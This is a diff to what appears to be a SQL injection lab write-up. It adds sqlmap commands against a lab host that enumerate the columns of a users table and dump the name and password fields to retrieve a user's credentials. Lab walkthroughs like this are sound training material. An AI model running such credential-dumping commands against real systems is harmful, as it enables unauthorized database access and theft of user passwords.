@@ -15,3 +15,10 @@ Initially running a broad `--schema` dump produced excessive noise, making it in
 
 ```bash
 sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" --search -C style --batch
+```
+#### Task 2: Extracting Target User Credentials (User: "Kimberly")
+To extract credentials efficiently without dumping heavy database overhead, I targeted the specific database and table structure. I first enumerated the column layout to confirm the exact parameter names before executing a targeted data dump.
+
+```bash
+sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --columns --batch
+sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --dump -C name,password --batch
